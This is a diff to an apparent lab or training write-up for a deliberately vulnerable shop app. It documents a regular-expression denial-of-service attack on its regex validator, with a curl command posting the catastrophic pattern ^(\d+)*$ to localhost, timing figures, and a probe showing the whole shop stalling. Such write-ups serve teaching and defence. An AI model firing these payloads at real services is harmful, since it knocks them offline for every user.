@@ -8,8 +8,11 @@ The regex validator compiles and tests any pattern against user text. `^(\d+)*$`
 
 ## Exploit
 
+1. Log in (any account) and open **Tools** → the regex validator. The form preloads the trap.
+
+2. Fire one request and time it:
+
 ```bash
-# while logged in:
 time curl -s -b cookies.txt -X POST http://localhost:8888/tools/regex \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data "pattern=^(\d+)*\$" \
@@ -19,18 +22,19 @@ time curl -s -b cookies.txt -X POST http://localhost:8888/tools/regex \
 Measured on the reference stack:
 
 ```text
+input of 24 chars → 0.09 s
 input of 28 chars → 6.7 s
 input of 31 chars → 27.3 s
 ```
 
-And it is not just one slow request — the event loop is blocked for everyone:
+3. Prove it is everyone's problem, not just a slow request. Probe the catalog from a second terminal while the attack runs:
 
 ```text
 catalog latency during the attack: [0.004, 0.006, 0.006, 27.143, 0.006, 0.006]
                                      …    ↑ all requests stall at the 27 s mark
 ```
 
-One 5 KB POST = full outage of the shop. No authentication to the attack surface matters either: any registered user can send it.
+One 5 KB POST = full outage of the shop. The attack surface needs any registered account — and in a real app, this class of bug usually lives on a public endpoint (contact form email validation, search-as-you-type…).
 
 ## Why it happens
 
